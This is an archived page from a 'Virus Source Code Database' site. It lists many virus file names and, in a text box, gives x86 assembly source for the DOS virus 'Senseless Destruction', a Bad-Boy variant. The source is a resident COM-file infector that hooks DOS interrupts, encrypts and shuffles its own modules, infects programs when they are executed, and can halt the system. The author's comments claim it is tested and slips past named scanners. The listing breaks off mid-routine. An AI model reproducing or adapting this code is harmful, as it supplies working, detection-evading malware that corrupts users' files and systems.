<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: destruct_asm</title>
<meta name="KEYWORDS" content="destruct.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for destruct.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="da_1800_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_1800_asm.php">da_1800_asm</a><br>
<a href="da_2000d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_2000d_asm.php">da_2000d_asm</a><br>
<a href="da_2100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_2100_asm.php">da_2100_asm</a><br>
<a href="da'boys__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da'boys__asm.php">da'boys__asm</a><br>
<a href="da'boys_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da'boys_asm.php">da'boys_asm</a><br>
<a href="daddy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/daddy_asm.php">daddy_asm</a><br>
<a href="daemaen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/daemaen_asm.php">daemaen_asm</a><br>
<a href="dame_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dame_asm.php">dame_asm</a><br>
<a href="dan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dan_asm.php">dan_asm</a><br>
<a href="danger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/danger_asm.php">danger_asm</a><br>
<a href="da_olivr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_olivr_asm.php">da_olivr_asm</a><br>
<a href="dapm2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dapm2_asm.php">dapm2_asm</a><br>
<a href="dark2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark2_asm.php">dark2_asm</a><br>
<a href="dark3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark3_asm.php">dark3_asm</a><br>
<a href="darkapoc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkapoc_asm.php">darkapoc_asm</a><br>
<a href="dark__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark__asm.php">dark__asm</a><br>
<a href="dark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark_asm.php">dark_asm</a><br>
<a href="darkaven_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkaven_asm.php">darkaven_asm</a><br>
<a href="darkstar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkstar_asm.php">darkstar_asm</a><br>
<a href="darlene_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darlene_asm.php">darlene_asm</a><br>
<a href="darth1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth1_asm.php">darth1_asm</a><br>
<a href="darth2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth2_asm.php">darth2_asm</a><br>
<a href="darth3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth3_asm.php">darth3_asm</a><br>
<a href="darth4___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4___asm.php">darth4___asm</a><br>
<a href="darth4__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4__asm.php">darth4__asm</a><br>
<a href="darth4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4_asm.php">darth4_asm</a><br>
<a href="darth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth_asm.php">darth_asm</a><br>
<a href="das_boot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/das_boot_asm.php">das_boot_asm</a><br>
<a href="datacrim_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datacrim_asm.php">datacrim_asm</a><br>
<a href="datalock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datalock_asm.php">datalock_asm</a><br>
<a href="datarape_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datarape_asm.php">datarape_asm</a><br>
<a href="datarp23_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datarp23_asm.php">datarp23_asm</a><br>
<a href="dav1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dav1_asm.php">dav1_asm</a><br>
<a href="dav_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dav_b_asm.php">dav_b_asm</a><br>
<a href="dbase_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dbase_asm.php">dbase_asm</a><br>
<a href="dc-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dc-b_asm.php">dc-b_asm</a><br>
<a href="dcii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dcii_asm.php">dcii_asm</a><br>
<a href="death_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/death_asm.php">death_asm</a><br>
<a href="de'buger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/de'buger_asm.php">de'buger_asm</a><br>
<a href="decode__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decode__asm.php">decode__asm</a><br>
<a href="decode_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decode_asm.php">decode_asm</a><br>
<a href="decom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decom_asm.php">decom_asm</a><br>
<a href="define___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define___asm.php">define___asm</a><br>
<a href="define__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define__asm.php">define__asm</a><br>
<a href="define_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define_asm.php">define_asm</a><br>
<a href="defs_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/defs_asm.php">defs_asm</a><br>
<a href="dei_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dei_asm.php">dei_asm</a><br>
<a href="deicide__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deicide__asm.php">deicide__asm</a><br>
<a href="deicide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deicide_asm.php">deicide_asm</a><br>
<a href="deldir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deldir_asm.php">deldir_asm</a><br>
<a href="demo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demo_asm.php">demo_asm</a><br>
<a href="demoexe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demoexe_asm.php">demoexe_asm</a><br>
<a href="demon__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demon__asm.php">demon__asm</a><br>
<a href="demon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demon_asm.php">demon_asm</a><br>
<a href="demov1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov1_asm.php">demov1_asm</a><br>
<a href="demov2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov2_asm.php">demov2_asm</a><br>
<a href="demov3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov3_asm.php">demov3_asm</a><br>
<a href="demov4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov4_asm.php">demov4_asm</a><br>
<a href="demov5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov5_asm.php">demov5_asm</a><br>
<a href="demovir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demovir_asm.php">demovir_asm</a><br>
<a href="destruct_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/destruct_asm.php">destruct_asm</a><br>
<a href="detect_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/detect_asm.php">detect_asm</a><br>
<a href="devdance_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/devdance_asm.php">devdance_asm</a><br>
<a href="dhog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dhog_asm.php">dhog_asm</a><br>
<a href="diamond__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diamond__asm.php">diamond__asm</a><br>
<a href="diamond_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diamond_asm.php">diamond_asm</a><br>
<a href="diarrhe4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diarrhe4_asm.php">diarrhe4_asm</a><br>
<a href="diarrhe6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diarrhe6_asm.php">diarrhe6_asm</a><br>
<a href="dieloser_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dieloser_pas.php">dieloser_pas</a><br>
<a href="digdeath_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/digdeath_asm.php">digdeath_asm</a><br>
<a href="digipol_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/digipol_asm.php">digipol_asm</a><br>
<a href="dikotomy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dikotomy_asm.php">dikotomy_asm</a><br>
<a href="diogenes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diogenes_asm.php">diogenes_asm</a><br>
<a href="dir-2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-2_asm.php">dir-2_asm</a><br>
<a href="dir2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir2_asm.php">dir2_asm</a><br>
<a href="dir_2d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_2d_asm.php">dir_2d_asm</a><br>
<a href="dir_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_ii_asm.php">dir_ii_asm</a><br>
<a href="dir-ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-ii_asm.php">dir-ii_asm</a><br>
<a href="dirii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dirii_asm.php">dirii_asm</a><br>
<a href="dir_iii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_iii_asm.php">dir_iii_asm</a><br>
<a href="dir-vir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-vir_asm.php">dir-vir_asm</a><br>
<a href="diskkill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diskkill_asm.php">diskkill_asm</a><br>
<a href="dissolve_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dissolve_asm.php">dissolve_asm</a><br>
<a href="dj_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dj_asm.php">dj_asm</a><br>
<a href="dkennedy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dkennedy_asm.php">dkennedy_asm</a><br>
<a href="donothin_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/donothin_asm.php">donothin_asm</a><br>
<a href="dontell__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dontell__asm.php">dontell__asm</a><br>
<a href="dontello_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dontello_asm.php">dontello_asm</a><br>
<a href="doodle_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doodle_asm.php">doodle_asm</a><br>
<a href="doom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doom_asm.php">doom_asm</a><br>
<a href="doomsday_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doomsday_asm.php">doomsday_asm</a><br>
<a href="dos_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos_1_asm.php">dos_1_asm</a><br>
<a href="dos-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos-1_asm.php">dos-1_asm</a><br>
<a href="dos1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos1_asm.php">dos1_asm</a><br>
<a href="doteater_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doteater_asm.php">doteater_asm</a><br>
<a href="dotkill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dotkill_asm.php">dotkill_asm</a><br>
<a href="dr20-inf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dr20-inf_asm.php">dr20-inf_asm</a><br>
<a href="dreamer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dreamer_asm.php">dreamer_asm</a><br>
<a href="dreamwrl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dreamwrl_asm.php">dreamwrl_asm</a><br>
<a href="droper_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/droper_asm.php">droper_asm</a><br>
<a href="drop_rep_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drop_rep_asm.php">drop_rep_asm</a><br>
<a href="dropsy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dropsy_asm.php">dropsy_asm</a><br>
<a href="drq-1028_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq-1028_asm.php">drq-1028_asm</a><br>
<a href="drq_1161_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq_1161_asm.php">drq_1161_asm</a><br>
<a href="drq-1161_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq-1161_asm.php">drq-1161_asm</a><br>
<a href="druid_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/druid_asm.php">druid_asm</a><br>
<a href="dsce-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsce-gen_asm.php">dsce-gen_asm</a><br>
<a href="dsmedemo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsmedemo_asm.php">dsmedemo_asm</a><br>
<a href="dsme-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsme-gen_asm.php">dsme-gen_asm</a><br>
<a href="dt_251_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_251_asm.php">dt_251_asm</a><br>
<a href="dt-251_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt-251_asm.php">dt-251_asm</a><br>
<a href="dt_310_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_310_asm.php">dt_310_asm</a><br>
<a href="dt-310_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt-310_asm.php">dt-310_asm</a><br>
<a href="dtiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dtiny_asm.php">dtiny_asm</a><br>
<a href="dt_kendy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_kendy_asm.php">dt_kendy_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

; VirusName: Senseless Destruction
; Country  : Sweden
; Author   : Metal Militia / Immortal Riot
; Date     : 07-22-1993
;
; This is an mutation of Bad-Boy from 'Unknown'.
; Many thanks to the scratch coder of Bad-Boy...
;
; We've tried this virus ourself, and it works just fine.
; It uses the TSR, is non-overwriting, and may halt
; the system. Command files increase by 1069 bytes.
; Originally from Europe discovered in 1991.
;
; This is the second mutation of The Bad Boy virus,
; the first mutation was found in Bulgaria.
;
; McAfee Scan v105 can't find it, and
; S&S Toolkit 6.5 don't find it either.
; I haven't tried with scanners like Fprot/Tbscan,
; but they will probably report some virus structure.
;
; Best Regards : [Metal Militia]
;               [The Unforgiven]
 
code       segment
       assume cs:code,ds:code
       .radix 16
       org  100
start:
       push word ptr cs:[tabb+2]
       push cs
       pop  ds
              jmp  loopshit
otto:
              jmp  start
loopshit:
              jmp  word ptr cs:[tabb]
 
curofs       dw   ?
files       db   0         ;number of infected files from this copy
fsize       dw   2         ;size of infected file
ftime       dw     ?
fdate       dw     ?
stdint21      dd     ?
oldint13      dd     ?
oldint21      dd     ?
oldint24      dd     ?
 
;------------- TABLE WITH MODULE PARAMETERS --------------------
tabb :
       dw   offset false_mod_1 ;00
       dw   offset mod_2       ;02
       dw   offset mod_3       ;04
       dw   offset mod_4       ;06        ;offset modules
       dw   offset mod_5       ;08
       dw   offset mod_6       ;0a
       dw   offset mod_7       ;0c
       dw   offset mod_8       ;0e
 
       dw   offset mod_2 - offset mod_1;10
       dw   offset mod_3 - offset mod_2;12
       dw   offset mod_4 - offset mod_3;14
       dw   offset mod_5 - offset mod_4;16
       dw   offset mod_6 - offset mod_5;18 ;size modules
       dw   offset mod_7 - offset mod_6;1a
       dw   offset mod_8 - offset mod_7;1c
       dw   offset myend - offset mod_8;1e
 
 
;------------- MODULE - 1 - CODER/DECODER ----------------------
mod_1:
       mov  bx,offset tabb+2   ;first module to working (module 2)
       mov  cx,6         ;number of modules to working
mod_1_lp1:
       cmp  bx,offset tabb+0a
       jne  mod_1_cont
       add  bx,2
mod_1_cont:
       push bx
       push cx
       mov  ax,[bx]        ;ax - offset module
       mov  cx,[bx+10]        ;cx - size of module
       mov  bx,ax
mod_1_lp2:
       xor  byte ptr [bx],al
       inc  bx
       loop mod_1_lp2
       pop  cx
       pop  bx
       add  bx,2
       loop mod_1_lp1
       ret
 
;------------- MODULE - 2 - MUTATION TO MEMORY -----------------
mod_2:
       ;instalation check
 
       mov    es,cs:[2]       ;memory size
       mov    di,100
       mov    si,100
       mov    cx,0bh
       repe   cmpsb
       jne    mod_2_install      ;jump if not install
       jmp    word ptr cs:[tabb+06]  ;if install, jump to module 4
 
mod_2_install:
       ;instalation
 
       mov    ax,cs
       dec    ax
       mov    ds,ax
 
       cmp    byte ptr ds:[0],'Z'
       je     mod_2_cont
 
       jmp    word ptr cs:[tabb+6]     ;if no last MCB - go to mod4
 
mod_2_cont:
       sub    word ptr ds:[3],0c0
       mov    ax,es
       sub    ax,0c0
       mov    es,ax
       mov    word ptr ds:[12],ax       ;decrement memory size with 2K
       push   cs
       pop    ds
 
mod_2_mut:
       mov  byte ptr cs:files,0
 
       mov  di,100
       mov  cx,offset mod_1-100
       mov  si,100
       rep  movsb     ;write table to new memory
 
       mov  bx,word ptr cs:[tabb]
       add  bx,offset mod_1_lp2-offset mod_1+1
       xor  byte ptr [bx],18      ;change code method
 
       mov  cx,8
       mov  word ptr curofs,offset mod_1
mod_2_lp1:
       push cx
       call mod_2_rnd ;generate random module addres
       push bx      ;addres in table returned from mod_2_rnd
       mov  ax,[bx]   ;offset module
       push ax
       add  bx,10
       mov  cx,[bx]   ;length of module
       pop  si
       pop  bx
       xchg di,curofs
       mov  word ptr es:[bx],di ;change module offset in table
       rep  movsb        ;copy module to new memory
       xchg di,curofs        ;change current offset in new memory
       mov  ax,8000
       or   word ptr [bx],ax    ;mark module - used
       pop  cx
       loop mod_2_lp1
       mov  cl,8
       not  ax
       mov  bx,offset tabb
mod_2_lp2:
       and  word ptr [bx],ax    ;unmark all modules
       add  bx,2
       loop mod_2_lp2
 
       jmp  word ptr cs:[tabb+4]  ;go to module 3
 
mod_2_rnd:
       push cx
       push es
       xor  cx,cx
       mov  es,cx
mod_2_lp3:
       mov  bx,es:[46c]
       db 81,0e3,07,00  ;and bx,7
       shl  bx,1
       add  bx,offset tabb
       test [bx],8000
       jnz  mod_2_lp3
       pop  es
       pop  cx
       ret
 
;------------- MODULE - 3 - SET INTERRUPT VECTORS ---------------
mod_3:
       xor    ax,ax
       mov    ds,ax
 
       mov    ax,ds:[4*21]
       mov    word ptr es:[oldint21],ax
       mov    ax,ds:[4*21+2]
       mov    word ptr es:[oldint21+2],ax
 
       mov    ah,30
       int    21
       cmp    ax,1e03
       jne    mod_3_getvec
 
       mov    word ptr es:[stdint21],1460
       mov    ax,1203
       push   ds
       int    2f
       mov    word ptr es:[stdint21+2],ds
       pop    ds
       jmp    mod_3_setvec
 
mod_3_getvec:
       mov    ax,ds:[4*21]
       mov    word ptr es:[stdint21],ax
       mov    ax,ds:[4*21+2]
       mov    word ptr es:[stdint21+2],ax
 
mod_3_setvec:
       cli
       mov    ax,word ptr es:[tabb+0c]
       mov    ds:[4*21],ax
       mov    ax,es
       mov    ds:[4*21+2],ax
       sti
 
       mov    cx,es
       mov    ah,13    ;
       int    2f     ;
       push   es     ;
       mov    es,cx    ;
       mov    word ptr es:[oldint13],dx  ; get standart int13 addres
       mov    word ptr es:[oldint13+2],ds ;
       pop    es     ;
       int    2f     ;
 
       jmp    word ptr cs:[tabb+06]        ;go to module 4
 
;------------- MODULE - 4 - RESTORE OLD PROGRAM CODE & START ----
mod_4:
       push   cs
       push   cs
       pop    ds
       pop    es
       mov    si,word ptr cs:[tabb+06]
       add    si,offset mod_4_cont - offset mod_4
       mov    di,cs:fsize
       add    di,offset myend+1
       push   di
       mov    cx,offset mod_5 - offset mod_4_cont
       cld
       rep    movsb
       ret
mod_4_cont:
       mov    si,cs:fsize
       add    si,100
 
       cmp    si,offset myend+1
       jnc    mod_4_cnt
       mov    si,offset myend+1
mod_4_cnt:
       mov    di,100
       mov    cx,offset myend-100
       rep    movsb
       mov    ax,100   ;
       push   ax       ; jmp 100
       ret       ;
 
;------------- MODULE - 5 - SPECIAL PROGRAM ---------------------
mod_5:
       mov    ah,9
       mov    dx,word ptr [tabb+8]
       add    dx,offset msg-offset mod_5
       push   cs
       pop    ds
       int    21
       cli
       hlt
 
msg           db     0dh,0a,'Senseless Destruction...',7,7,'$'
 
;------------- MODULE - 6 - INT 24 HEADER -----------------------
mod_6:
       mov    al,3
       iret
              db     'Protecting what we are ',0
              db     'joining together to take on the world.. ',0
              db     'METAL MiLiTiA [iMM0RTAL Ri0T] ',0
 
 
 
 
;------------- MODULE - 7 - INT 21 HEADER -----------------------
mod_7:
       push   bx
       push   si
       push   di
       push   es
       push   ax
 
       cmp    ax,4b00
       je     mod_7_begin
              jmp    mod_7_exit
mod_7_begin:
       push   ds
       push   cs           ;
       pop    es           ;
       xor    ax,ax          ;
       mov    ds,ax          ;
       mov    si,4*24          ;
       mov    di,offset oldint24         ;
       movsw           ;   change int24 vector
       movsw           ;
       mov    ax,word ptr cs:[tabb+0a]        ;
       cli           ;
       mov    ds:[4*24],ax         ;
       mov    ax,cs          ;
       mov    ds:[4*24+2],ax         ;
       sti
       pop    ds
 
       mov    ax,3d00          ;
       pushf           ;
       call   cs:oldint21         ;
       jc     mod_7_ex          ; open,infect,close file
       mov    bx,ax          ;
mod_7_infect:					       ;
	      call   word ptr cs:[tabb+0e]	       ;
	      pushf
	      mov    ah,3e			       ;
	      pushf				       ;
	      call   cs:oldint21		       ;
	      popf
	      jc     mod_7_ex
 
	      push   ds 			 ;
	      cli				 ;
	      xor    ax,ax			 ;
	      mov    ds,ax			 ;
	      mov    ax,word ptr cs:[oldint13]	 ;
	      xchg   ax,word ptr ds:[4*13]	 ;
	      mov    word ptr cs:[oldint13],ax	 ; exchange int13 vectors
	      mov    ax,word ptr cs:[oldint13+2] ;
	      xchg   ax,word ptr ds:[4*13+2]	 ;
	      mov    word ptr cs:[oldint13+2],ax ;
	      sti				 ;
	      pop    ds 			 ;
mod_7_ex:
	      push   ds 			       ;
	      xor    ax,ax			       ;
	      mov    ds,ax			       ;
	      mov    ax,word ptr cs:oldint24	       ;
	      mov    ds:[4*24],ax		       ;
	      mov    ax,word ptr cs:oldint24+2	       ; restore int24 vector
	      mov    ds:[4*24+2],ax		       ;
	      pop    ds 			       ;
 
mod_7_exit:
	      pop    ax
	      pop    es
	      pop    di
	      pop    si
	      pop    bx
 
	      jmp    cs:oldint21
 
;------------- MODULE - 8 - INFECTING (bx - file handle) --------
mod_8:
	      push   cx
	      push   dx
	      push   ds
	      push   es
	      push   di
	      push   bp
 
	      push   bx
	      mov    ax,1220
	      int    2f
	      mov    bl,es:[di]
	      xor    bh,bh
	      mov    ax,1216
	      int    2f
	      pop    bx
 
	      mov    ax,word ptr es:[di+11]
	      cmp    ax,0f000
	      jc     mod_8_c
	      jmp    mod_8_exit
 
mod_8_c:
	      mov    word ptr es:[di+2],2		   ;open mode - R/W
 
	      mov    ax,es:[di+11]
	      mov    cs:fsize,ax	       ; save file size
 
	      mov    ax,word ptr es:[di+0dh]   ;
	      mov    word ptr cs:[ftime],ax    ; save file date/time
	      mov    ax,word ptr es:[di+0f]    ;
	      mov    word ptr cs:[fdate],ax    ;
 
	      push   cs 			 ;
	      pop    ds 			 ;
	      mov    dx,offset myend+1		 ;
	      mov    cx,offset myend-100	 ; read first bytes
	      mov    ah,3f			 ;
	      pushf
	      call   cs:oldint21
	      jnc    mod_8_cnt
	      jmp    mod_8_exit
 
mod_8_cnt:
	      mov    bp,ax			 ; ax - bytes read
	      mov    si,dx
	      mov    ax,'MZ'
	      cmp    ax,word ptr ds:[si]
	      jne    mod_8_nxtchk
	      jmp    mod_8_exit
mod_8_nxtchk:
	      xchg   ah,al
	      cmp    ax,ds:[si]
	      jne    mod_8_cnt2
	      jmp    mod_8_exit
 
mod_8_cnt2:
	      push   es
	      push   di
	      push   cs 			 ;
	      pop    es 			 ;
	      mov    si,100			 ;
	      mov    di,dx			 ; check for infected file
	      mov    cx,0bh			 ;
	      repe   cmpsb			 ;
	      pop    di
	      pop    es
	      jne    mod_8_cnt1 		 ;
	      jmp    mod_8_exit
mod_8_cnt1:
	      mov    word ptr es:[di+15],0     ; fp:=0
 
	      push   es
	      push   di
	      mov    si,word ptr cs:[tabb+0e]
	      add    si,offset mod_8_cont - offset mod_8
	      xor    di,di
	      push   cs
	      pop    es
	      mov    cx,offset mod_8_cont_end - offset mod_8_cont
	      cld
	      rep    movsb
	      pop    di
	      pop    es
 
	      mov    si,word ptr cs:[tabb+0e]
	      add    si,offset mod_8_cont_end - offset mod_8
	      push   si
	      xor    si,si
	      push   si
 
	      push   ds 			 ;
	      cli				 ;
	      xor    ax,ax			 ;
	      mov    ds,ax			 ;
	      mov    ax,word ptr cs:[oldint13]	 ;
	      xchg   ax,word ptr ds:[4*13]	 ;
	      mov    word ptr cs:[oldint13],ax	 ;
